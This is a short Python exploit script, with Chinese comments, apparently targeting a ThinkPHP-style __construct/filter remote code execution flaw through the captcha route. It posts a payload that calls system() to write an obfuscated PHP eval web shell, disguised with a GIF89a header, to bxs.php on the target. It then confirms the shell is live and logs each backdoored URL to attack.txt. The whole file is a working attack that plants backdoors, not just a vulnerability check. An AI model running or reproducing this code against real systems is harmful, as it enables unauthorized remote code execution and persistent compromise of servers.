import requests
import urllib3
# 验证完毕
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def check(url):
    print(f"[info] {url}-construct_code_exec2漏洞")
    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
        "Cookie": "PHPSESSID=zkj4alqbyfkez2i3l9erwqlkq",
        "Content-type":"application/x-www-form-urlencoded",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    }

    try:
        requests.post(url=f"{url}/index.php?s=captcha",timeout=5,headers=headers,data=r"_method=__construct&method=GET&filter[]=system&get[]=echo 'Gif89a%3C%3Fphp+class+GYUJ9g7l+%7B+public+function+__construct%28%24H7zX3%29%7B+%40eval%28%22%2F*Z7Cc4urWV9*%2F%22.%24H7zX3.%22%2F*Z7Cc4urWV9*%2F%22%29%3B+%7D%7Dnew+GYUJ9g7l%28%24_REQUEST%5B%224k4d666%22%5D%29%3B%3F%3E' >bxs.php",verify=False)
        res = requests.post(url=f"{url}/bxs.php",headers=headers,verify=False,timeout=5)
        if "Gif89a" in res.text :
            print(f"---->[construct_code_exec2] 上传成功，请检查：{url}/bxs.php")
            with open("attack.txt",'a') as attack:
                attack.write(f"shell:{url}/bxs.php,construct_code_exec2\n")
            
    except:
        print(f"[error] {url}-construct_code_exec2漏洞")
    pass
